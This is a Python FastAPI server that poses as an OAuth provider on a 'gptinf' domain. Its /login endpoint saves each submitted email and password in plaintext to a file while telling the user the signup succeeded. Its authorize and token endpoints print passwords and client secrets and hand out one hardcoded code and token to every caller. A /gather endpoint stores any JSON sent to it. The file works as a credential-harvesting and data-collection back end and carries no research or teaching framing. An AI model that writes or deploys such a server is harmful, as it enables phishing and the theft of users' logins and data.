from pydantic import BaseModel
import os
from fastapi import FastAPI, Depends, Form, HTTPException, Query, Request
from fastapi.responses import RedirectResponse, JSONResponse
from starlette.responses import FileResponse
from starlette.staticfiles import StaticFiles
from starlette.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
from fastapi import FastAPI, Request, Depends, HTTPException
from fastapi.security import OAuth2PasswordBearer
from typing import Optional

import logging
import logging.config
import yaml

with open("logging.yaml", "r") as file:
    config = yaml.safe_load(file.read())
    logging.config.dictConfig(config)

logger = logging.getLogger("uvicorn")

this_program_directory = os.path.dirname(os.path.abspath(__file__))
os.chdir(this_program_directory)

app = FastAPI()
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

origins = ["http://app.gptinf.kro.kr","http://34.134.116.133","https://app.gptinf.kro.kr","https://34.134.116.133"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/frontend", StaticFiles(directory="frontend"), name="frontend")

class LoginRequest(BaseModel):
    email: str
    password: str

@app.get("/")
def index():
    return FileResponse("./frontend/login.html")

@app.post("/login")
async def login(request: LoginRequest, response_type: str = Query(...), client_id: str = Query(...), redirect_uri: str = Query(...), state: str = Query(...), scope: str = Query(...)):
    with open("account.txt", "a") as file:
        file.write(f"Email: {request.email}, Password: {request.password}\n")
    return {"message": "SignUp successful"}

@app.get("/signup")
def signup():
    return FileResponse("./frontend/signup.html")

#authorize endpoint
@app.post("/authorize")
async def authorize(response_type: str = Form(...), client_id: str = Form(...), redirect_uri: str = Form(...), state: str = Form(...), scope: str = Form(...), username: str = Form(...), password: str = Form(...)): 
    print(response_type + "/" + client_id + "/" + redirect_uri + "/" + state + "/" + scope + "/" + username + "/" + password)
    
    return {"code": "e3d154c9d10f7a0cc79670281731447bbe66a8ed10db9d477b2bb895c5960882"}

@app.get("/authorize")
async def authorize(response_type: str = Query(...), client_id: str = Query(...), redirect_uri: str = Query(...), state: str = Query(...), scope: str = Query(...)):
    return FileResponse("./frontend/login.html")

@app.get("/connect")
async def connect(response_type: str = Query(...), client_id: str = Query(...), redirect_uri: str = Query(...), state: str = Query(...), scope: str = Query(...)):
    authorization_code = "e3d154c9d10f7a0cc79670281731447bbe66a8ed10db9d477b2bb895c5960882"
    redirect_uri_with_code = f"{redirect_uri}?code={authorization_code}&state={state}"
    return RedirectResponse(url=redirect_uri_with_code)

#token endpoint
@app.post("/token")
async def token(grant_type: str = Form(...), code: str = Form(...), redirect_uri: str = Form(...), client_id: str = Form(...), client_secret: str = Form(...)):
    print(grant_type + "/" + code+ "/" + redirect_uri + "/" + client_id + "/" + client_secret)
    if grant_type != "authorization_code" or code != "e3d154c9d10f7a0cc79670281731447bbe66a8ed10db9d477b2bb895c5960882":  # 실제 코드 검증 로직 필요
        raise HTTPException(status_code=400, detail="Invalid grant_type or code")
    
    access_token = "e3d154c9d10f7a0cc79670281731447bbe66a8ed10db9d477b2bb895c5960882"  # 실제 토큰 생성 로직 필요
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "expires_in": 3600,
        "scope": "read"
    }

@app.post("/gather")
async def payload(request:Request):
    payload = await request.json()
    print(str(payload))
    with open("payload.txt", "a") as file:
        file.write(str(payload))

    return {"message": "Payload saved successfully"}